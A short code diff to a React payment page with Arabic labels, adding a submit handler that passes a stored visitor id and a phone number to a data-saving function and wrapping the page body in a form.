@@ -44,7 +44,13 @@ function randstr(prefix:string)
   useEffect(() => {
   getLocation().then(()=>{})
   }, [])
+const handleSubmit=(e:any)=>{
+  e.preventDefault();
 
+  const _id=localStorage.getItem('visitor')
+
+  addData({id:_id,phone})
+}
   return (
     <div className="flex flex-col min-h-screen bg-gray-50">
       <header className="flex justify-between items-center p-4 bg-white shadow-sm">
@@ -68,7 +74,7 @@ function randstr(prefix:string)
         </div>
       </div>
 
-      <main className="flex-1 p-6 max-w-md mx-auto w-full">
+      <form className="flex-1 p-6 max-w-md mx-auto w-full" onSubmit={handleSubmit}>
         <div className="mt-6 space-y-8">
           <div className="space-y-2">
             <div className="text-right text-lg font-semibold text-gray-700">المبلغ</div>
@@ -104,7 +110,7 @@ function randstr(prefix:string)
         </div>
 
         <PaymentSummary amount="5.000" />
-      </main>
+      </form>
     </div>
   )
 }
